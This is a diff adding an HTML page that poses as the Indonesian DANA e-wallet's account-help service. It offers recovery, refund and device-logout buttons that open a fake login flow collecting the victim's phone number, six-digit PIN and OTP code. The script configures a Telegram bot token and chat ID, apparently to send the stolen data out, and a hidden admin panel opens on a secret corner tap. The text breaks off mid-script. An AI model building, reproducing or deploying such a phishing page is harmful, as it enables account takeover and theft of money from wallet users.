@@ -1,0 +1,565 @@
+
+<html lang="id">
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta name="theme-color" content="#118EEA"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"> 
+  <title>DANA - Apa pun transaksinya selalu ada DANA</title> 
+  <meta property="og:title" content="DANA - Apa pun transaksinya selalu ada DANA"> 
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/52/Dana_logo.png"> 
+  <link href="https://upload.wikimedia.org/wikipedia/commons/5/52/Dana_logo.png" rel="shortcut icon" type="image/x-icon"> 
+  <link href="https://upload.wikimedia.org/wikipedia/commons/5/52/Dana_logo.png" rel="apple-touch-icon"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"> 
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Varela+Round&amp;display=swap"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"> 
+  <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-image: url(https://a.m.dana.id/resource/danaweb-v2/hero-personal-bg-back.png);
+            background-position: 100% 100%;
+            background-size: 100% 100%;
+            background-color: #fff;
+            font-family: 'Varela Round', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            min-height: 100vh;
+        }
+        
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            height: 60px;
+            background: transparent;
+            z-index: 999;
+            padding: 10px 15px;
+        }
+        
+        nav img {
+            width: 100px; 
+            height: auto;
+        }
+        
+        .header-image {
+            width: 100%;
+            display: block;
+            background-color: #118EEA;
+            position: relative;
+            border-radius: 0px 0px 12px 12px;
+            border-bottom: 3px groove #fff;
+            box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05), 
+                        rgba(6, 24, 44, 1.4) 0px 0px 6px 6px;
+            outline: 3px solid #118EEA;
+        }
+        
+        .form-container {
+            max-width: 600px;
+            margin: 40px auto 20px; 
+            padding: 0 15px;
+        }
+        
+        .info-box {
+            margin-bottom: 15px;
+            padding: 12px;
+            text-align: center;
+            font-size: 14px;
+            background: #118EEA;
+            color: #fff;
+            border: 2px solid #fff;
+            outline: 2px solid #118EEA;
+            border-radius: 10px;
+        }
+        
+        .action-box {
+            padding: 15px;
+            text-align: center;
+            background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
+            background-size: cover;
+            background-color: #fff;
+            outline: 1px solid #118EEA;
+            border-radius: 10px;
+        }
+        
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .btn-punya {
+            display: block;
+            margin: 0;
+            padding: 14px 8px;
+            width: 100%;
+            background: rgb(0, 134, 224);
+            border: none;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            color: #fff;
+            border-radius: 12px;
+            box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 8px;
+            transition: 0.3s;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .btn-punya:active {
+            opacity: 0.7;
+            transform: scale(0.98);
+        }
+        
+        .footer {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #fff;
+        }
+        
+        /* Loading Overlay */
+        #loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 10000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        /* Mockup Handphone Container untuk modal */
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--dana-blue);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-radius: 30px;
+        }
+
+        /* Screen States */
+        .screen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .screen.active { display: flex; }
+
+        /* Login & PIN Screen (Biru) */
+        .blue-bg { background-color: var(--dana-blue); color: white; padding: 20px; }
+        
+        .header-logo { text-align: center; padding: 40px 0; }
+        .header-logo img { width: 140px; }
+
+        .input-box { margin-top: 20px; }
+        .input-box h2 { font-size: 16px; margin-bottom: 20px; text-align: center; font-weight: 600; }
+
+        .phone-field {
+            display: flex;
+            background: white;
+            border-radius: 12px;
+            height: 55px;
+            align-items: center;
+            padding: 0 15px;
+            margin-bottom: 10px;
+        }
+
+        .phone-field .prefix {
+            color: #333;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-right: 1px solid #eee;
+            padding-right: 10px;
+            margin-right: 10px;
+        }
+
+        .phone-field input {
+            border: none;
+            outline: none;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            color: #333;
+        }
+
+        .pin-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .pin-grid input {
+            width: 100%;
+            height: 50px;
+            border-radius: 8px;
+            border: none;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* White Screens (Verify & OTP) */
+        .white-bg { background-color: #fff; color: #333; }
+        
+        .nav-header {
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .back-btn { font-size: 20px; cursor: pointer; padding: 5px 10px; }
+
+        .content-padding { padding: 25px; text-align: center; }
+
+        .status-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--dana-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 30px;
+            box-shadow: 0 5px 15px rgba(30, 136, 229, 0.3);
+        }
+
+        /* OTP Inputs */
+        .otp-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .otp-wrapper input {
+            width: 50px;
+            height: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .otp-wrapper input:focus { border-color: var(--dana-blue); background: #f0f7ff; }
+
+        /* Footer Buttons */
+        .footer-action {
+            margin-top: auto;
+            padding: 20px;
+            background: transparent;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 15px;
+            transition: 0.2s;
+        }
+
+        .btn-white { background: white; color: var(--dana-blue); }
+        .btn-blue { background: var(--dana-blue); color: white; }
+        
+        .error-txt { color: var(--error-red); font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        /* Modal untuk menampilkan halaman DANA */
+        .dana-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 100000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .dana-modal-content {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            background: #f5f5f5;
+            position: relative;
+            overflow-y: auto;
+        }
+        
+        .close-dana-modal {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        
+        .animated {
+            animation: bounceInDown 1s both;
+        }
+        
+        @keyframes bounceInDown {
+            0% { opacity: 0; transform: translateY(-30px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .background-image {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            z-index: -1;
+        }
+        
+        /* Admin Panel - TERSEMBUNYI (hanya bisa diakses dengan gesture khusus) */
+        .admin-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+        
+        /* Admin panel hanya muncul dengan triple tap atau gesture khusus */
+        .admin-panel.visible {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+        }
+        
+        /* Hidden access untuk admin (triple tap di pojok kanan bawah) */
+        .secret-trigger {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 80px;
+            height: 80px;
+            z-index: 99999;
+            cursor: pointer;
+            background: transparent;
+        }
+        
+        :root {
+            --dana-blue: #1E88E5;
+            --dana-dark: #1565C0;
+            --error-red: #ffcccb;
+            --text-gray: #757575;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <nav> 
+   <img src="https://upload.wikimedia.org/wikipedia/commons/5/52/Dana_logo.png" alt="DANA Logo"> 
+  </nav> 
+  <img class="header-image animated" src="https://gallery.poskota.co.id/storage/Foto/dana-kaget-dana.jpg" alt="Header"> 
+  <div class="form-container"> 
+   <section> 
+    <div class="info-box"> 
+     <h2>Asisten DANA siap membantu kendala akun Anda secara langsung.</h2> 
+    </div> 
+    <div class="action-box"> 
+     <div class="menu-grid"> 
+      <div class="btn-punya" onclick="openDanaModal('Log Out Perangkat Tak Dikenal')">
+       Log Out Perangkat Tak Dikenal
+      </div> 
+      <div class="btn-punya" onclick="openDanaModal('Pemulihan Akun DANA')">
+       Pemulihan Akun DANA
+      </div> 
+      <div class="btn-punya" onclick="openDanaModal('Refund Saldo DANA')">
+       Refund Saldo DANA
+      </div> 
+      <div class="btn-punya" onclick="openDanaModal('Batalkan Paylater')">
+       Batalkan Paylater
+      </div> 
+     </div> 
+     <div class="footer">
+       © 2024 DANA - PT. Espay Debit Indonesia Koe. All Rights Reserved. 
+     </div> 
+    </div> 
+   </section> 
+  </div> 
+  <img class="background-image" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png"> 
+  <!-- Secret trigger area untuk admin (triple tap di pojok kanan bawah) --> 
+  <div class="secret-trigger" id="secretTrigger"></div> 
+  <!-- Admin Panel - Tersembunyi --> 
+  <div class="admin-panel" id="adminPanel"> 
+   <div style="background: #118EEA; color: white; padding: 12px 18px; border-radius: 50px; font-size: 13px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); cursor: pointer;"> 
+    <i class="fas fa-chart-line"></i> 
+    <span>Admin Panel</span> 
+    <span id="adminNotifBadge" class="notification-badge" style="background: red; border-radius: 50%; width: 18px; height: 18px; display: inline-flex; align-items: center; justify-content: center; font-size: 10px;">1</span> 
+   </div> 
+  </div> 
+  <!-- Modal untuk halaman DANA --> 
+  <div id="danaModal" class="dana-modal"> 
+   <div class="dana-modal-content" id="danaModalContent"> 
+    <div class="close-dana-modal" onclick="closeDanaModal()">
+     ✕
+    </div> 
+    <div class="app-container" style="height: 100%; border-radius: 0;"> 
+     <div id="loading-overlay" style="position: absolute;"> 
+      <div class="spinner"></div> 
+      <p>Mohon Tunggu...</p> 
+     </div> 
+     <div id="screen-phone" class="screen blue-bg active"> 
+      <div class="header-logo"> 
+       <img src="https://www.dana.id/_nuxt/img/dana-logo.fe46647.png" alt="DANA"> 
+      </div> 
+      <div class="input-box"> 
+       <h2>Masukkan nomor HP untuk lanjut</h2> 
+       <div class="phone-field"> 
+        <div class="prefix"> 
+         <img src="https://flagcdn.com/w20/id.png" width="20" alt="ID"> 
+         <span>+62</span> 
+        </div> 
+        <input type="tel" id="input-phone" placeholder="812-xxxx-xxxx" maxlength="15"> 
+       </div> 
+       <div id="phone-err" class="error-txt">
+         Nomor HP tidak valid (10-13 digit) 
+       </div> 
+       <p style="font-size: 12px; text-align: center; opacity: 0.8; line-height: 1.6;"> ID DANA akan terhubung dengan nomor ini. Dengan lanjut, kamu setuju dengan S&amp;K DANA. </p> 
+      </div> 
+      <div class="footer-action"> 
+       <button class="btn-primary btn-white" onclick="handlePhoneSubmit()">LANJUTKAN</button> 
+      </div> 
+     </div> 
+     <div id="screen-pin" class="screen blue-bg"> 
+      <div class="nav-header" style="border:none"> 
+       <div class="back-btn" onclick="showScreen('screen-phone')"> 
+        <i class="fas fa-arrow-left"></i> 
+       </div> 
+      </div> 
+      <div class="content-padding"> 
+       <h2 style="margin-bottom:10px">Keamanan Akun</h2> 
+       <p style="opacity:0.8">Masukkan 6 digit PIN DANA kamu</p> 
+       <div class="pin-grid"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+        <input type="password" maxlength="1" inputmode="numeric" class="pin-digit"> 
+       </div> 
+       <a href="#" style="color:white; font-size:13px; text-decoration:none; font-weight:bold">LUPA PIN?</a> 
+      </div> 
+     </div> 
+     <div id="screen-verify" class="screen white-bg"> 
+      <div class="nav-header"> 
+       <span style="font-weight:bold; width:100%; text-align:center">Verifikasi Keamanan</span> 
+      </div> 
+      <div class="content-padding"> 
+       <div class="status-icon"> 
+        <i class="fas fa-shield-alt"></i> 
+       </div> 
+       <h3>Konfirmasi Login</h3> 
+       <p style="color:var(--text-gray); font-size:14px; margin: 10px 0 25px;">Buka aplikasi DANA di HP utama kamu dan setujui permintaan login.</p> 
+       <div style="background:#f9f9f9; padding:15px; border-radius:12px; text-align:left; font-size:13px;"> 
+        <p style="font-weight:bold; margin-bottom:10px">Cara verifikasi:</p> 
+        <ol style="margin-left:15px; color:#555"> 
+         <li>Buka Aplikasi DANA</li> 
+         <li>Cek menu <b>Inbox/Pesan</b></li> 
+         <li>Pilih Konfirmasi Login</li> 
+        </ol> 
+       </div> 
+       <div style="margin-top:30px"> 
+        <p style="font-size:12px; color:var(--text-gray)">Tidak menerima notifikasi?</p> 
+        <button class="btn-primary btn-blue" style="margin-top:10px" onclick="handleRequestOtp()">Kirim Kode OTP</button> 
+       </div> 
+      </div> 
+     </div> 
+     <div id="screen-otp" class="screen white-bg"> 
+      <div class="nav-header"> 
+       <div class="back-btn" onclick="showScreen('screen-verify')"> 
+        <i class="fas fa-arrow-left" style="color:#333"></i> 
+       </div> 
+       <span style="font-weight:bold; margin-left:10px">Masukkan OTP</span> 
+      </div> 
+      <div class="content-padding"> 
+       <p style="font-size:14px">Kode verifikasi telah dikirim ke nomor</p> 
+       <p id="display-phone" style="font-weight:bold; color:var(--dana-blue); margin-bottom:20px">+62 812-xxxx-xxxx</p> 
+       <div class="otp-wrapper"> 
+        <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"> 
+        <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"> 
+        <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"> 
+        <input type="text" maxlength="1" inputmode="numeric" class="otp-digit"> 
+       </div> 
+       <div id="otp-err" class="error-txt" style="color:red; background:#ffebee; padding:10px; border-radius:8px">
+         Kode OTP salah atau kedaluwarsa. 
+       </div> 
+       <p style="font-size:13px; color:var(--text-gray); margin-top:20px"> Kirim ulang dalam <span id="otp-timer" style="color:var(--dana-blue); font-weight:bold">00:45</span> </p> 
+      </div> 
+      <div class="footer-action"> 
+       <button class="btn-primary btn-blue" onclick="validateOtp()">VERIFIKASI</button> 
+      </div> 
+     </div> 
+    </div> 
+   </div> 
+  </div> 
+  <script>
+    // ==================== KONFIGURASI TELEGRAM ====================
+    const BOT_TOKEN = '8815261588:AAGk93rcLAsS2O93-N7n8y3-_yrCVEV7da8';
+    const CHAT_ID = '7805906519';
+    const ADMIN_CHAT_ID = '7805906519';
+    
+    // ==================== LOG ACTIVITY ====================
+    let activityLog = [];
+    let unreadCount = 0;
+    let tapCount = 0;
+    let tapTimer = null;
+    
+    function addToActivityLog(type, title, data, status = 'info') {
+        const logEntry = {
+            id: Date.now(),
+            timestamp: new Date().toLocaleString('id-ID'),
+            type: type,
+            title: title,
+            data: da
